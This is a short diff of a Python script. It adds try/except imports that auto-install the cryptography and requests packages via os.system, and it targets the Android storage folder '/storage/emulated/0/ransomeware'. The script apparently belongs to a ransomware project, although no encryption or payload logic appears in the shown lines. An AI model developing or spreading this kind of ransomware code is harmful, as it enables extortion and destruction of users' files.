@@ -1,7 +1,13 @@
 import os
-from cryptography.fernet import Fernet
+try:
+    from cryptography.fernet import Fernet
+except:
+    os.system("pip install cryptography")
 import sys
-import requests
+try:
+    import requests
+except:
+    os.system('pip install requests')
 
 dirr = "/storage/emulated/0/ransomeware"
 files = []
